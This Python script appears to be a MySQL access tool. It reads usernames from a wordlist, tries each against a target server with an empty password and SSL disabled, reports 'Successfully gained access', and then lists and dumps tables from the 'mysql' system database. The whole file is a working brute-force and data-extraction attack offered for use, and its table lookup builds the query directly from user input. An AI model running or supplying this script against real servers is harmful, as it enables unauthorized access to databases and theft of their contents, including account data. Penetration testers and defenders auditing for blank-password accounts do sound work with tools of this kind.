import mysql.connector
from mysql.connector import Error
import time

def connect_to_database(host, user, password):
    try:
        # Define the connection parameters
        config = {
            'user': user,
            'password': password,
            'host': host,
            'database': 'mysql',
            'use_pure': True,
            'charset': 'utf8',
            'ssl_disabled': True
        }

        # Connect to MySQL
        cnx = mysql.connector.connect(**config)
        print(f"Successfully gained access with username: {user}")
        return cnx

    except Error as e:
        print(f"Error occurred: {e}")
        return None

def main():
    try:
        # Ask the user for the IP address and wordlist file
        host = input("Enter the IP address of the MySQL server: ")
        wordlist_file = input("Enter the path to the wordlist file for usernames: ")

        # Attempt to connect using usernames from the wordlist
        cnx = None
        with open(wordlist_file, 'r') as file:
            usernames = file.readlines()
            for username in usernames:
                username = username.strip()
                print(f"Trying username: {username}")
                cnx = connect_to_database(host, username, '')
                if cnx:
                    break

        if cnx:
            # Add a delay of 10 seconds
            print("Retrieving tables...")
            time.sleep(10)

            while True:
                # Create a cursor object
                cursor = cnx.cursor()

                # Execute a query to retrieve tables
                query = "SHOW TABLES"
                cursor.execute(query)

                # Fetch the tables
                tables = cursor.fetchall()

                # Print all tables
                print("Tables in the database:")
                for table in tables:
                    print(table[0])

                # Ask the user if they want to view a specific table or all tables
                view_option = input("Enter the name of the table you want to view or type 'exit' to quit: ")
                if view_option.lower() == 'exit':
                    break
                else:
                    try:
                        # Print the content of the specified table
                        cursor.execute(f"SELECT * FROM {view_option}")
                        rows = cursor.fetchall()
                        if not rows:
                            print(f"No data in the table {view_option}.")
                        else:
                            print(f"\nContent of the table {view_option}:")
                            for row in rows:
                                print(row)
                    except Error as e:
                        print(f"Error occurred while fetching data from {view_option}: {e}")
                    print()
                cursor.close()

    except FileNotFoundError:
        print("File not found. Please provide a valid path to the wordlist file.")
    except Error as e:
        print(f"Error: {e}")
    finally:
        # Close the connection
        if 'cnx' in locals() and cnx is not None:
            cnx.close()

if __name__ == "__main__":
    main()

